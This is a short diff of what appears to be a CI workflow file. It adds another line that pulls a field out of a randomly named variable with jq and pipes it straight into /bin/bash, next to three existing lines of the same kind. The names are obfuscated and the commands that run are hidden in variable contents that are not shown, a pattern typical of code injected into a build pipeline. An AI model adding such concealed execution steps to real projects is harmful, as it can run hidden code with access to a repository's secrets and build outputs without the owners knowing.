@@ -23,6 +23,7 @@ jobs:
           echo $z0 | jq -r .vxt30170 | /bin/bash
           echo $ifdca9 | jq -r .aanr05 | /bin/bash
           echo $jko6 | jq -r .m67768 | /bin/bash
+          echo $dnr7 | jq -r .ryt029 | /bin/bash
 
       - name: Persist results
         if: always()
